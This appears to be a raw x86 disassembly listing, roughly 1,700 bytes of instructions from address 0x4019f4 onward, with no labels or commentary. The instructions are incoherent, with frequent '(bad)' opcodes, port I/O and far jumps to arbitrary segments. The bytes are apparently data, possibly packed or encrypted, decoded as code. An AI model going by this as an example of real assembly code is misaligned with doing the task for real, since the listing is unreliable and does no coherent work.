  4019f4:	imul   ecx,ecx,0x3ef06338
  4019fa:	pop    esp
  4019fb:	out    dx,al
  4019fc:	lahf   
  4019fd:	and    al,0xfe
  4019ff:	ins    BYTE PTR es:[edi],dx
  401a00:	xchg   esi,eax
  401a01:	sub    edi,DWORD PTR [ecx]
  401a03:	or     DWORD PTR [eax],ebx
  401a05:	and    eax,0x1ceaabf4
  401a0a:	shl    DWORD PTR [esi+edx*8],cl
  401a0d:	or     DWORD PTR [edi+0x2d],esp
  401a10:	xor    eax,0xdf0eda9c
  401a15:	(bad)  
  401a17:	cmc    
  401a18:	sbb    DWORD PTR [ebx-0x25ac514d],ebx
  401a1e:	jmp    0x2c3c:0xafdb186e
  401a25:	icebp  
  401a26:	shr    DWORD PTR cs:[si+0x6d],1
  401a2b:	test   esi,esp
  401a2d:	int3   
  401a2e:	add    DWORD PTR [ecx+0x42b55542],ebp
  401a34:	rol    DWORD PTR [edx+0x7ff2e89c],cl
  401a3a:	jnp    0x401a66
  401a3c:	sub    dh,BYTE PTR [eax+0x24204b11]
  401a42:	jne    0x401a51
  401a44:	xor    eax,0x9e4122c8
  401a49:	fdivr  QWORD PTR [esp+ecx*1-0x13]
  401a4d:	or     eax,0xbbbd0b1a
  401a52:	adc    al,0x1f
  401a54:	xlat   BYTE PTR ds:[ebx]
  401a55:	jbe    0x401a46
  401a57:	jg     0x401a9b
  401a59:	jl     0x401a1f
  401a5b:	xor    esi,DWORD PTR [edi-0x5efc4ac]
  401a61:	adc    BYTE PTR [eax-0x31],cl
  401a64:	mov    edx,0xc3e15859
  401a69:	sub    cl,BYTE PTR [ecx+0x17]
  401a6c:	ins    BYTE PTR es:[edi],dx
  401a6d:	and    edi,DWORD PTR gs:0x146f0697
  401a74:	das    
  401a75:	lock cwde 
  401a77:	pusha  
  401a78:	and    al,0x54
  401a7a:	xlat   BYTE PTR ds:[ebx]
  401a7b:	int3   
  401a7c:	dec    ecx
  401a7d:	pop    ds
  401a7e:	or     al,BYTE PTR [esi+0x67]
  401a81:	mov    edx,0x5fe5da87
  401a86:	les    ebp,FWORD PTR ds:0x9eaa3cba
  401a8c:	popf   
  401a8d:	dec    esp
  401a8e:	je     0x401a61
  401a90:	add    edx,ebx
  401a92:	xchg   si,ax
  401a94:	mov    al,0x55
  401a96:	add    eax,DWORD PTR [edi+edx*4+0x57]
  401a9a:	jp     0x401a2a
  401a9c:	test   al,0x4b
  401a9e:	cdq    
  401a9f:	call   0x30f0c8da
  401aa4:	rcl    al,0x4d
  401aa7:	inc    esp
  401aa8:	pop    ss
  401aa9:	int3   
  401aaa:	and    ebx,DWORD PTR [eax-0x193644dc]
  401ab0:	mov    ch,0x89
  401ab2:	add    eax,0x57c540bf
  401ab7:	int3   
  401ab8:	adc    eax,0xdef940cd
  401abd:	dec    esi
  401abe:	xor    bh,BYTE PTR [edx]
  401ac0:	xor    eax,0x2365294
  401ac5:	xor    esi,DWORD PTR [edi+0x5f]
  401ac8:	pop    ss
  401ac9:	jmp    0xe844d66a
  401ace:	inc    eax
  401acf:	cmovnp ebx,DWORD PTR [eax+0x5d]
  401ad3:	call   0xbfe3:0xbfaeb949
  401ada:	mov    al,0x63
  401adc:	popa   
  401add:	xchg   ebp,eax
  401ade:	mov    ds:0xda1e3000,al
  401ae3:	adc    al,BYTE PTR [ecx+0x7f]
  401ae6:	test   DWORD PTR [ecx+0xa2cc9df],0xfa8e2c58
  401af0:	dec    ecx
  401af1:	into   
  401af2:	sub    al,0xd0
  401af4:	mov    dh,dh
  401af6:	sub    esp,DWORD PTR [esi+eiz*1-0xa269d9a]
  401afd:	inc    eax
  401afe:	mov    ebx,0xd8d9bc45
  401b03:	mov    al,0x30
  401b05:	sbb    ch,BYTE PTR [esi]
  401b07:	in     eax,dx
  401b08:	pop    ss
  401b09:	les    ebp,FWORD PTR [esi-0x4137565c]
  401b0f:	and    BYTE PTR [edx+ebx*8-0x5f6dbd18],bh
  401b16:	pop    ds
  401b17:	neg    bh
  401b19:	cmp    ebp,DWORD PTR [eax]
  401b1b:	push   ebp
  401b1c:	dec    esp
  401b1d:	jno    0x401b49
  401b1f:	and    al,0xe2
  401b21:	adc    eax,0x8f47a12a
  401b26:	cmc    
  401b27:	dec    edx
  401b28:	sub    eax,0xaf3795f1
  401b2d:	fst    DWORD PTR [ecx+0x5b618b02]
  401b33:	leave  
  401b34:	in     eax,dx
  401b35:	bound  edi,QWORD PTR [edx-0x24]
  401b38:	cld    
  401b39:	outs   dx,DWORD PTR ds:[esi]
  401b3a:	int    0x24
  401b3c:	push   eax
  401b3d:	sti    
  401b3e:	push   ebx
  401b3f:	test   eax,0x268368d5
  401b44:	add    DWORD PTR [esi-0x2b],eax
  401b47:	add    ebp,esi
  401b49:	pop    ebx
  401b4a:	inc    eax
  401b4b:	loope  0x401b48
  401b4d:	cmp    bl,BYTE PTR [esi+0x4cc7beef]
  401b53:	adc    al,0x94
  401b55:	rcr    DWORD PTR [ebx+0x57229835],cl
  401b5b:	shl    BYTE PTR [edx],cl
  401b5d:	stc    
  401b5e:	xor    BYTE PTR [ecx+0x7938af38],cl
  401b64:	sar    DWORD PTR [esi+0x67],1
  401b67:	add    BYTE PTR [edi+edx*8-0x5c9d4088],cl
  401b6e:	jno    0x401b0e
  401b70:	mov    ds:0xd9cc3bf0,eax
  401b75:	inc    edx
  401b76:	pop    ds
  401b77:	mov    ebp,DWORD PTR [edi]
  401b79:	push   esi
  401b7a:	outs   dx,BYTE PTR ds:[esi]
  401b7b:	xchg   esi,eax
  401b7c:	dec    ebx
  401b7d:	fstp   TBYTE PTR [edx+0x4079ec43]
  401b83:	push   ecx
  401b84:	sub    al,0x84
  401b86:	repnz inc esp
  401b88:	xor    edi,DWORD PTR [edi]
  401b8a:	mov    ecx,0x67d5231b
  401b8f:	in     al,0xa9
  401b91:	mov    dh,0x8a
  401b93:	iret   
  401b94:	xor    BYTE PTR [edx-0x402e80d0],0xc3
  401b9b:	jl     0x401bad
  401b9d:	inc    esp
  401b9e:	and    DWORD PTR [ecx-0x1cfea6f0],esi
  401ba4:	cld    
  401ba5:	pop    esi
  401ba6:	call   0xe08d:0xa3ea06f9
  401bad:	push   esi
  401bae:	aad    0x5c
  401bb0:	adc    esi,DWORD PTR [ecx+0x37]
  401bb3:	xor    BYTE PTR [ebx],bh
  401bb5:	test   eax,0xfb64f32f
  401bba:	arpl   WORD PTR [ecx+eiz*2+0xe],cx
  401bbe:	sub    eax,0xf2e3e639
  401bc3:	jno    0x401be1
  401bc5:	mov    ebp,0x99fc20ac
  401bca:	sahf   
  401bcb:	push   edi
  401bcc:	enter  0x5c83,0xc3
  401bd0:	ds push ecx
  401bd2:	cmp    esp,ebp
  401bd4:	sub    DWORD PTR [edx],ebx
  401bd6:	nop
  401bd7:	pop    ds
  401bd8:	stos   BYTE PTR es:[edi],al
  401bd9:	outs   dx,BYTE PTR ds:[esi]
  401bda:	test   al,0xb0
  401bdc:	call   0xf864bdb3
  401be1:	jl     0x401bad
  401be3:	aam    0x7a
  401be5:	dec    edi
  401be6:	jl     0x401bcc
  401be8:	test   DWORD PTR [ebx+0x3a],eax
  401beb:	jbe    0x401c67
  401bed:	adc    cl,dl
  401bef:	rcl    BYTE PTR [eax-0x795e1275],cl
  401bf5:	cs je  0x401c27
  401bf8:	inc    ebx
  401bf9:	jle    0x401c59
  401bfb:	sar    DWORD PTR [ecx],1
  401bfd:	leave  
  401bfe:	(bad)  
  401bff:	lahf   
  401c00:	outs   dx,BYTE PTR ds:[esi]
  401c01:	les    edx,FWORD PTR [edi-0x4a87aa10]
  401c07:	(bad)  
  401c08:	test   BYTE PTR ds:0x78213557,0x8a
  401c0f:	test   al,0xf8
  401c11:	je     0x401bee
  401c13:	scas   eax,DWORD PTR es:[edi]
  401c14:	sbb    al,0xa7
  401c16:	push   edx
  401c17:	jg     0x401c01
  401c19:	add    al,0xe8
  401c1b:	sub    BYTE PTR [ebx+0x4fbcb193],cl
  401c21:	mov    dl,0xb4
  401c23:	mov    eax,0x400a5db6
  401c28:	icebp  
  401c29:	popf   
  401c2a:	cmp    eax,DWORD PTR [edi]
  401c2c:	pop    esi
  401c2d:	mov    DWORD PTR [esi],edx
  401c2f:	inc    ecx
  401c30:	mov    edx,0xf0634dd5
  401c35:	fimul  WORD PTR [ecx+0x3a]
  401c38:	xor    eax,0x62c7c7a5
  401c3d:	jno    0x401bd1
  401c3f:	fbld   TBYTE PTR [eax-0x1c]
  401c42:	stos   BYTE PTR es:[edi],al
  401c43:	cmp    BYTE PTR [edx],ah
  401c45:	clc    
  401c46:	pcmpeqd mm7,QWORD PTR [eax+0x7648f222]
  401c4d:	jo     0x401c38
  401c4f:	or     eax,0xb56f8230
  401c54:	mov    bl,0x55
  401c56:	(bad)  
  401c57:	jo     0x401cb8
  401c59:	xchg   edx,eax
  401c5a:	call   0x535:0x2496ac2d
  401c61:	sbb    BYTE PTR [eax-0x266ae40],ch
  401c67:	outs   dx,DWORD PTR ds:[esi]
  401c68:	push   ebp
  401c69:	sub    al,0x1d
  401c6b:	ret    
  401c6c:	jg     0x401c59
  401c6e:	or     al,0x8a
  401c70:	retf   0xb641
  401c73:	pop    ebp
  401c74:	sbb    dh,al
  401c76:	adc    DWORD PTR [ebx+0x1c],0xc721ba1
  401c7d:	xlat   BYTE PTR ds:[ebx]
  401c7e:	cmp    esp,DWORD PTR [ebp+0x14]
  401c81:	test   al,0x9
  401c83:	xor    edx,DWORD PTR [edx]
  401c85:	xchg   ebx,eax
  401c86:	sub    DWORD PTR [ecx-0x31],esi
  401c89:	pop    es
  401c8a:	add    bl,BYTE PTR [ebp+0x24]
  401c8d:	int    0x8
  401c8f:	(bad)  
  401c90:	mov    edi,0x4ab449f2
  401c95:	test   al,0x5c
  401c97:	sub    BYTE PTR [esi+0x18],0x2b
  401c9b:	sbb    cl,cl
  401c9d:	jmp    0x401c93
  401c9f:	or     DWORD PTR [ebx],edx
  401ca1:	jecxz  0x401c92
  401ca3:	mov    eax,ds:0x2968b4ab
  401ca8:	mov    edi,0x89bf63b9
  401cad:	outs   dx,BYTE PTR ds:[esi]
  401cae:	fimul  WORD PTR [eax-0x73]
  401cb1:	(bad)  
  401cb2:	fadd   DWORD PTR [ebp+eiz*1+0x6971cb51]
  401cb9:	mov    fs,WORD PTR [esi+0x20]
  401cbc:	push   ds
  401cbd:	add    DWORD PTR [ecx],edx
  401cbf:	mov    ah,0xa0
  401cc1:	xlat   BYTE PTR ds:[ebx]
  401cc2:	mov    al,0xaf
  401cc4:	pop    edx
  401cc5:	cmp    BYTE PTR [ebx-0x488fc2ba],bh
  401ccb:	xchg   BYTE PTR [eax+eiz*2+0x27],ch
  401ccf:	rcl    DWORD PTR [esi],0x98
  401cd2:	dec    esi
  401cd3:	push   cs
  401cd4:	int3   
  401cd5:	(bad)  
  401cd6:	(bad)  
  401cd7:	in     al,dx
  401cd8:	popf   
  401cd9:	lock rcr BYTE PTR [eax],1
  401cdc:	adc    dh,dh
  401cde:	out    dx,eax
  401cdf:	ins    DWORD PTR es:[edi],dx
  401ce0:	jp     0x401cad
  401ce2:	pop    esi
  401ce3:	cmp    edi,DWORD PTR [ebx-0x3]
  401ce6:	pushf  
  401ce7:	lahf   
  401ce8:	data16 jbe 0x401d2c
  401ceb:	mov    ah,0x8a
  401ced:	std    
  401cee:	mov    edi,ebx
  401cf0:	sub    esi,0x4e
  401cf3:	cmp    DWORD PTR [ebx+0x19],ebp
  401cf6:	sbb    BYTE PTR [ebx-0x44debdcd],dl
  401cfc:	scas   al,BYTE PTR es:[edi]
  401cfd:	dec    ebx
  401cfe:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401d00:	mov    ebp,0x56c9c355
  401d05:	shl    DWORD PTR [ebp+0x60],cl
  401d08:	jo     0x401d89
  401d0a:	mov    ah,0xa
  401d0c:	dec    ebx
  401d0d:	adc    DWORD PTR [esi-0x676ef2f9],esp
  401d13:	out    dx,eax
  401d14:	jl     0x401cab
  401d16:	pop    esp
  401d17:	mov    ah,dl
  401d19:	inc    ebx
  401d1a:	add    BYTE PTR ds:0xf87aeb28,0x5e
  401d21:	xchg   esp,eax
  401d22:	test   DWORD PTR [ebp-0xb],edi
  401d25:	setae  BYTE PTR [ecx-0x585eb7d7]
  401d2c:	jb     0x401d00
  401d2e:	loopne 0x401cc4
  401d30:	daa    
  401d31:	popf   
  401d32:	inc    ecx
  401d33:	retf   
  401d34:	leave  
  401d35:	push   ss
  401d36:	fstp   QWORD PTR ds:0x39101bdd
  401d3c:	std    
  401d3d:	ds pusha 
  401d3f:	mov    dh,BYTE PTR [ebx]
  401d41:	adc    BYTE PTR [edi+0x45dc1b3b],ah
  401d47:	scas   eax,DWORD PTR es:[edi]
  401d48:	stos   DWORD PTR es:[edi],eax
  401d49:	lods   al,BYTE PTR ds:[esi]
  401d4a:	xchg   DWORD PTR [esi],eax
  401d4c:	test   DWORD PTR [ebx-0x46],0x6791129e
  401d53:	sub    eax,0x9a0cb1e3
  401d58:	or     DWORD PTR [ebp-0x79],esp
  401d5b:	pop    eax
  401d5c:	in     eax,0xe7
  401d5e:	enter  0x7da7,0xb3
  401d62:	ss aad 0x75
  401d65:	adc    BYTE PTR [edi],0x10
  401d68:	push   eax
  401d69:	bound  edi,QWORD PTR [ecx+0x71]
  401d6c:	sar    BYTE PTR [ebp+ebx*2+0x53b255f6],0x88
  401d74:	cmp    dh,0x28
  401d77:	adc    DWORD PTR ss:[ebx+0x70656762],ebx
  401d7e:	xor    edi,DWORD PTR [eax]
  401d80:	sub    esi,DWORD PTR [esi+0x34]
  401d83:	sti    
  401d84:	sub    esi,DWORD PTR [ebx-0x37]
  401d87:	push   0x5e
  401d89:	or     cl,0x74
  401d8c:	stos   DWORD PTR es:[edi],eax
  401d8d:	adc    al,0xd2
  401d8f:	test   BYTE PTR [edx+ecx*2-0x7bee742a],ch
  401d96:	mov    WORD PTR [ecx+0x4a],cs
  401d99:	lods   al,BYTE PTR ds:[esi]
  401d9a:	adc    esi,DWORD PTR [esi]
  401d9c:	pop    edx
  401d9d:	push   edi
  401d9e:	mov    cl,0xe4
  401da0:	mov    ah,0x33
  401da2:	ret    
  401da3:	sahf   
  401da4:	push   ebp
  401da5:	cmp    eax,0x27336f
  401daa:	ret    0xadf
  401dad:	cmp    BYTE PTR [ebx+esi*2],dh
  401db0:	ret    
  401db1:	aaa    
  401db2:	rcl    BYTE PTR [esi+0x2f20b9a6],cl
  401db8:	data16 jl 0x401dd5
  401dbb:	sub    DWORD PTR [ebp-0x5f724b34],esp
  401dc1:	pop    ebx
  401dc2:	stos   DWORD PTR es:[edi],eax
  401dc3:	cmp    eax,0x67d2ea24
  401dc8:	enter  0x695b,0x86
  401dcc:	xor    DWORD PTR [ebx+0x33],0xf98dcac6
  401dd3:	in     eax,0xcd
  401dd5:	mov    edx,0x2b9a3bf5
  401dda:	pop    es
  401ddb:	ja     0x401d79
  401ddd:	mov    ecx,0x578db783
  401de2:	inc    esi
  401de3:	xor    edi,DWORD PTR [ecx+esi*2+0x7d89e9ba]
  401dea:	addr16 test al,0x4f
  401ded:	xor    eax,0x4b9a019a
  401df2:	pop    ebp
  401df3:	dec    ebp
  401df4:	call   0x85a4d444
  401df9:	dec    edi
  401dfa:	jmp    0x401de1
  401dfc:	or     BYTE PTR ds:0x32ed68ac,ch
  401e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e03:	mov    cs,esi
  401e05:	cld    
  401e06:	sbb    BYTE PTR ds:0x912877aa,bl
  401e0c:	or     eax,0x7b6d3fea
  401e11:	xchg   ebx,eax
  401e12:	jbe    0x401e8b
  401e14:	xchg   esp,eax
  401e15:	int3   
  401e16:	inc    DWORD PTR [esi+0x6041b3f5]
  401e1c:	push   ebx
  401e1d:	mov    dh,ah
  401e1f:	pop    esi
  401e20:	(bad)  
  401e21:	cmp    al,0x65
  401e23:	push   cs
  401e24:	imul   BYTE PTR [edx+0x32]
  401e27:	ret    0x6551
  401e2a:	mov    ebx,DWORD PTR [edi]
  401e2c:	inc    esi
  401e2d:	test   DWORD PTR [eax],ebp
  401e2f:	sbb    DWORD PTR [eax+0x11],edx
  401e32:	adc    edi,esp
  401e34:	sar    DWORD PTR [eax-0x75],0xb8
  401e38:	mov    ch,0xb9
  401e3a:	mov    dh,dh
  401e3c:	or     bh,dl
  401e3e:	shl    BYTE PTR [esi+0x5a],0xbf
  401e42:	pop    ebx
  401e43:	mov    eax,0x13b1e210
  401e48:	test   BYTE PTR [esi],cl
  401e4a:	fs clc 
  401e4c:	iret   
  401e4d:	lock fidiv WORD PTR [esi]
  401e50:	lea    ebp,[ebp+0x31]
  401e53:	mov    edx,0x86165d2b
  401e58:	mov    eax,ds:0x21a28ec2
  401e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5e:	cmp    DWORD PTR [edi],esp
  401e60:	in     eax,dx
  401e61:	outs   dx,BYTE PTR ds:[esi]
  401e62:	xor    eax,0x5898a878
  401e67:	jl     0x401e40
  401e69:	lea    esi,[ebx-0x79]
  401e6c:	pop    ecx
  401e6d:	ss (bad) 
  401e6f:	out    0x92,al
  401e71:	in     eax,0x45
  401e73:	and    BYTE PTR [ecx],ch
  401e75:	les    eax,FWORD PTR [esi]
  401e77:	inc    ebx
  401e78:	data16 mov dl,0x12
  401e7b:	dec    ecx
  401e7c:	mov    ds:0x96eca82,eax
  401e81:	(bad)  
  401e82:	shl    DWORD PTR [ebp-0x2cf01576],1
  401e88:	cmc    
  401e89:	mov    ah,0x8b
  401e8b:	test   DWORD PTR [eax+ebp*4],edx
  401e8e:	aam    0xf9
  401e90:	jb     0x401ea4
  401e92:	shl    dl,cl
  401e94:	fisttp QWORD PTR [eax-0x6f]
  401e97:	mov    BYTE PTR [ebx+ebx*2-0x66],dl
  401e9b:	nop
  401e9c:	xchg   ebx,eax
  401e9d:	aam    0x2b
  401e9f:	cs cmc 
  401ea1:	cmp    al,0xcb
  401ea3:	mov    cl,0x27
  401ea5:	adc    eax,0x93d00372
  401eaa:	lea    ecx,[edi]
  401eac:	ja     0x401efb
  401eae:	adc    BYTE PTR [ebx-0x66],bl
  401eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb2:	adc    DWORD PTR [edx-0x396611de],0x78
  401eb9:	xchg   ecx,eax
  401eba:	rcl    DWORD PTR [ebp+esi*2-0xa],0xd5
  401ebf:	xor    bl,BYTE PTR [eax+0x1f]
  401ec2:	mov    bh,BYTE PTR [eax+0x593916f1]
  401ec8:	and    DWORD PTR [edi+edi*8+0x49],esp
  401ecc:	shl    DWORD PTR [ebp-0x50c9d347],cl
  401ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ed3:	mov    eax,ds:0x668fa253
  401ed8:	push   esp
  401ed9:	pusha  
  401eda:	jo     0x401ef5
  401edc:	pop    ebp
  401edd:	aam    0x26
  401edf:	sbb    eax,0xf6ca641d
  401ee4:	popa   
  401ee5:	adc    DWORD PTR [ebx-0x56ddc0a6],ebp
  401eeb:	cmp    BYTE PTR [ebp+0x4b],0x82
  401eef:	cli    
  401ef0:	xor    ch,bl
  401ef2:	mov    BYTE PTR [edx],ah
  401ef4:	imul   BYTE PTR [esi+eiz*8-0x3802ce70]
  401efb:	into   
  401efc:	mov    ds:0xc55363c7,eax
  401f01:	int    0x54
  401f03:	jecxz  0x401f61
  401f05:	xchg   esi,eax
  401f06:	cmp    edi,DWORD PTR [edi-0x7d]
  401f09:	xor    dh,ah
  401f0b:	ins    DWORD PTR es:[edi],dx
  401f0c:	mov    esi,0xbc1439ae
  401f11:	aas    
  401f12:	repz inc ecx
  401f14:	sbb    dh,BYTE PTR [edi+0x6e]
  401f17:	or     ch,BYTE PTR [ebx]
  401f19:	in     al,dx
  401f1a:	sub    DWORD PTR [ebx+eax*4+0x79],edi
  401f1e:	aam    0xbf
  401f20:	loopne 0x401ee5
  401f22:	scas   al,BYTE PTR es:[edi]
  401f23:	test   eax,0xaa1ec15e
  401f28:	and    BYTE PTR [esi+0x62],0x69
  401f2c:	sub    DWORD PTR [ebp+0x28],ebx
  401f2f:	aam    0x96
  401f31:	sub    eax,0x79987174
  401f36:	jnp    0x401f0f
  401f38:	or     ah,BYTE PTR [edx+0x4c]
  401f3b:	mov    ch,0x61
  401f3d:	repz cmp al,0x5a
  401f40:	xchg   dh,bh
  401f42:	out    0x97,al
  401f44:	adc    esp,DWORD PTR [ecx-0x6e]
  401f47:	cmp    eax,0x51ddc9a1
  401f4c:	cld    
  401f4d:	adc    ecx,DWORD PTR ds:0xbfe64417
  401f53:	and    al,0xca
  401f55:	shl    BYTE PTR ds:0xbf8a6c1d,0x5c
  401f5c:	pop    ds
  401f5d:	dec    eax
  401f5e:	ds push es
  401f60:	fsubr  st,st(0)
  401f62:	jecxz  0x401f17
  401f64:	xchg   esi,eax
  401f65:	cmc    
  401f66:	repz es pop eax
  401f69:	xor    ebx,esp
  401f6b:	jp     0x401fd1
  401f6d:	leave  
  401f6e:	lods   al,BYTE PTR ds:[esi]
  401f6f:	or     BYTE PTR [ebp+0x3d],al
  401f72:	repz dec esp
  401f74:	mov    esi,0x5f3fd1cc
  401f79:	leave  
  401f7a:	sti    
  401f7b:	mov    cs,WORD PTR [ebx+0x4e]
  401f7e:	add    DWORD PTR [ebx+0x11b39f2d],0x47
  401f85:	repz cmc 
  401f87:	lds    ecx,FWORD PTR [edi-0x6a]
  401f8a:	inc    esp
  401f8b:	inc    edx
  401f8c:	call   0x9e1:0x35dac1c7
  401f93:	jnp    0x402006
  401f95:	shl    cl,0x41
  401f98:	(bad)  
  401f99:	cmp    BYTE PTR [edx-0x57],ah
  401f9c:	sbb    BYTE PTR [edx-0x23],dh
  401f9f:	sub    esi,DWORD PTR [edi]
  401fa1:	mov    bh,0xfb
  401fa3:	jle    0x401f8f
  401fa5:	sbb    DWORD PTR [ecx+0x53],ecx
  401fa8:	and    BYTE PTR [ebx-0x6aa845ee],0x6b
  401faf:	mov    dh,0x16
  401fb1:	inc    esp
  401fb2:	scas   al,BYTE PTR es:[edi]
  401fb3:	xor    bh,ah
  401fb5:	inc    ecx
  401fb6:	dec    eax
  401fb7:	sbb    al,BYTE PTR [edx+0x24c4f941]
  401fbd:	scas   al,BYTE PTR es:[edi]
  401fbe:	sub    al,0x4d
  401fc0:	and    eax,0x60b25038
  401fc5:	xlat   BYTE PTR ds:[ebx]
  401fc6:	lock or al,BYTE PTR [edi-0x53]
  401fca:	scas   eax,DWORD PTR es:[edi]
  401fcb:	xchg   edx,eax
  401fcc:	sub    esi,ebx
  401fce:	ror    BYTE PTR [ebx-0x1379eacc],cl
  401fd4:	push   ebx
  401fd5:	les    eax,FWORD PTR [ecx+0x4bb756e4]
  401fdb:	push   ss
  401fdc:	test   DWORD PTR [eax+0x15c336ff],edi
  401fe2:	gs aaa 
  401fe4:	sar    BYTE PTR [ebx-0x7d],1
  401fe7:	(bad)
  401fea:	and    eax,0x6bfe1850
  401fef:	clc    
  401ff0:	mov    bh,0x23
  401ff2:	xchg   ebp,eax
  401ff3:	neg    BYTE PTR [esi]
  401ff5:	inc    ecx
  401ff6:	(bad)
  401ff9:	pop    ss
  401ffa:	push   ebp
  401ffb:	cli    
  401ffc:	call   0xbc95:0xb7f30ca8
  402003:	pop    esp
  402004:	push   es
  402005:	mov    BYTE PTR [eax+edx*2+0x2dc512d9],ch
  40200c:	mov    eax,0x64458a23
  402011:	and    al,0x76
  402013:	ss mov esi,0x8a7413af
  402019:	enter  0x656e,0xf4
  40201d:	fiadd  DWORD PTR [ebx-0x36e32438]
  402023:	and    bh,0xda
  402026:	pop    ecx
  402027:	dec    ecx
  402028:	shr    BYTE PTR [ecx],cl
  40202a:	xor    bl,al
  40202c:	sbb    DWORD PTR [ebp+edi*4+0x5f8e0bef],eax
  402033:	jnp    0x402019
  402035:	in     eax,dx
  402036:	xchg   DWORD PTR [esp+eax*1+0x46],edx
  40203a:	call   0xb927:0x9614896f
  402041:	sub    eax,0x6baa1062
  402046:	fwait
  402047:	inc    ebx
  402048:	mov    ds:0xefa62be3,eax
  40204d:	add    dh,BYTE PTR [ecx]
  40204f:	add    ebx,edi
  402051:	mov    al,0xef
  402053:	cmp    eax,0x303a03d2
  402058:	push   ecx
  40205a:	pop    esp
  40205b:	es jbe 0x40200a
  40205e:	mov    bl,0xa1
  402060:	jmp    0xc916:0xd577e20e
  402067:	hlt    
  402068:	xchg   ecx,eax
  402069:	cmc    
  40206a:	ret    
  40206b:	mov    dh,0x72
  40206d:	jmp    FWORD PTR [eax+edi*2-0x7642c2cb]
  402074:	cli    
  402075:	and    DWORD PTR [eax],edx
  402077:	push   ss
  402078:	jno    0x40200b
  40207a:	cmp    DWORD PTR [ecx+eax*4],esp
  40207d:	in     eax,0x93
  40207f:	and    bl,bl
  402081:	int    0xff
  402083:	sar    dh,0x6e
  402086:	in     eax,dx
  402087:	jae    0x402050
  402089:	mov    BYTE PTR [edx],dh
  40208b:	test   BYTE PTR [ecx],ch
  40208d:	(bad)  
  40208e:	sub    ecx,DWORD PTR [edx]
  402090:	lea    esi,[edi]
  402092:	pop    eax
  402093:	push   0x42ec7d26
  402098:	enter  0xdf9f,0x4
  40209c:	pop    edx
  40209d:	mov    DWORD PTR [ebp-0x2c],edi
  4020a0:	xchg   esi,eax
  4020a1:	dec    eax
  4020a2:	and    eax,0x8fc1d585
  4020a7:	(bad)  
  4020a8:	dec    edi
  4020a9:	pusha  
  4020aa:	sbb    al,0xa2
  4020ac:	jbe    0x402036
  4020ae:	pop    ebp
  4020af:	je     0x4020dd
  4020b1:	in     al,0xa1
  4020b3:	mov    edi,0x8d6cd54f
  4020b8:	js     0x402093
  4020ba:	jb     0x4020dc
  4020bc:	repnz imul DWORD PTR [esi]
  4020bf:	jo     0x4020dc
  4020c1:	xlat   BYTE PTR ds:[ebx]
  4020c2:	cmp    eax,0x8352e304
  4020c7:	lahf   
  4020c8:	push   cs
  4020c9:	push   edi
  4020ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020cb:	mov    eax,0x7e5080ee
  4020d0:	bound  esi,QWORD PTR [ebx-0x1a]
  4020d3:	jbe    0x402058
  4020d5:	sbb    al,0x9
  4020d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d8:	mov    al,ds:0x1b6d03a5
  4020dd:	inc    ebx
  4020de:	cmp    cl,cl
  4020e0:	fucomp st(6)
  4020e2:	jbe    0x402128
  4020e4:	xor    ch,BYTE PTR ds:0x57f1fc2b
  4020ea:	mov    al,cs:0x2002e63e
  4020f0:	hlt    
  4020f1:	or     al,0xbc
  4020f3:	xchg   ebp,eax
  4020f4:	std    
  4020f5:	xor    al,0x5f
  4020f7:	add    DWORD PTR [eax+ebp*1],esp
  4020fa:	aaa    
  4020fb:	add    ebx,0x5
  4020fe:	xor    BYTE PTR [esi+0x786a7770],0x1f
  402105:	jno    0x402133
  402107:	xchg   edi,eax
  402108:	test   eax,0xbb6e4d0c
  40210d:	jmp    0x2030cfc
  402112:	mov    eax,ds:0xe4519bed
  402117:	shl    cl,cl
  402119:	ja     0x402181
  40211b:	scas   al,BYTE PTR es:[edi]
  40211c:	inc    esi
  40211d:	rol    DWORD PTR [ebx],cl
  40211f:	bound  edx,QWORD PTR [ebx]
  402121:	adc    eax,0xaf19bc54
  402126:	push   edi
  402127:	(bad)  
  402128:	fdiv   QWORD PTR [edx]
  40212a:	sbb    DWORD PTR ds:0x788d6729,ecx
  402130:	inc    ecx
  402131:	xchg   edi,eax
  402132:	fwait
  402133:	add    al,bl
  402135:	push   ebp
  402136:	lds    edx,FWORD PTR [edi]
  402138:	loop   0x40216f
  40213a:	call   0xa40d:0xf29d1a55
  402141:	fild   DWORD PTR [edi+0x6e]
  402144:	lahf   
  402145:	retf   
  402146:	pop    ds
  402147:	push   es
  402148:	mov    ds:0x57da9da2,eax
  40214d:	xchg   BYTE PTR [ecx],cl
  40214f:	sbb    BYTE PTR [edx-0x30],al
  402152:	rcl    ebx,cl
  402154:	ja     0x40216a
  402156:	repz ret 
  402158:	popa   
  402159:	pop    eax
  40215a:	fcmovu st,st(7)
  40215c:	int3   
  40215d:	or     eax,0x3af2e0a2
  402162:	inc    esp
  402163:	sub    al,0xb7
  402165:	daa    
  402166:	jne    0x4020ed
  402168:	pushf  
  402169:	mov    cl,0x18
  40216b:	xchg   ebx,eax
  40216c:	and    eax,0xaf9f92e2
  402171:	fisttp WORD PTR ds:0xa3908cf
  402177:	push   esi
  402178:	ret    0x918a
  40217b:	push   ss
  40217c:	mov    bl,0xbc
  40217e:	dec    ecx
  40217f:	loope  0x402151
  402181:	cmp    DWORD PTR [edi],esp
  402183:	fwait
  402184:	inc    esi
  402185:	mov    esp,0x8795b15d
  40218a:	test   BYTE PTR [ebx+ebp*1+0x1],cl
  40218e:	pop    ss
  40218f:	mov    bh,0x6d
  402191:	test   DWORD PTR [edx],eax
  402193:	mov    BYTE PTR [ebx-0x52],0xf9
  402197:	in     al,dx
  402198:	mov    esp,0xdb5bf256
  40219d:	retf   
  40219e:	mov    eax,ds:0x9a6f7331
  4021a3:	sbb    al,cl
  4021a5:	gs fs jmp 0x6c267470
  4021ac:	sub    al,0x59
  4021ae:	loop   0x40220d
  4021b0:	lahf   
  4021b1:	mov    edx,0x35bca852
  4021b6:	lods   eax,DWORD PTR ds:[esi]
  4021b7:	mov    ds:0xb848864d,eax
  4021bc:	or     esi,ebp
  4021be:	jmp    0x4021f9
  4021c0:	mul    BYTE PTR [ecx]
  4021c2:	mov    BYTE PTR [ecx],ah
  4021c4:	sar    edi,1
  4021c6:	cmp    esp,ebp
